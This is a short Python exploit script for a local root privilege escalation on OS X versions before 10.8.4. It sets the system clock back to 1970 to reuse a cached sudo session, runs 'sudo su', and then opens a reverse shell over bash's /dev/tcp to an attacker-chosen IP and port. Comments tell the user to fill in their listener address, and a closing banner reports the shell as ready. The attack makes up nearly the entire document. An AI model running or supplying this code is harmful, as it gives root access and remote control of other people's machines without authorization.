import subprocess
 
# IPADDR for REVERSE SHELL - change this to your attacker IP address
ipaddr = "192.168.1.1"
 
# PORT for REVERSE SHELL - change this to your attacker port address
port = "4444"
 
# drop into a root shell - replace 192.168.1.1 with the reverse listener
proc = subprocess.Popen('bash', shell=False, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
proc.stdin.write("systemsetup -setusingnetworktime Off -settimezone GMT -setdate 01:01:1970 -settime 00:00;sudo su\nbash -i >& /dev/tcp/%s/%s 0>&1 &\n" % (ipaddr,port))
print """
###############################################################
#
# OSX < 10.8.4 Local Root Priv Escalation Root Reverse Shell
#
# Written by: David Kennedy @ TrustedSec
# Website: https://www.trustedsec.com
# Twitter: @Dave_ReL1K
#
# Reference: http://www.exploit-db.com/exploits/27944/
###############################################################
"""
print "[*] Exploit has been performed. You should have a shell on ipaddr: %s and port %s" % (ipaddr,port)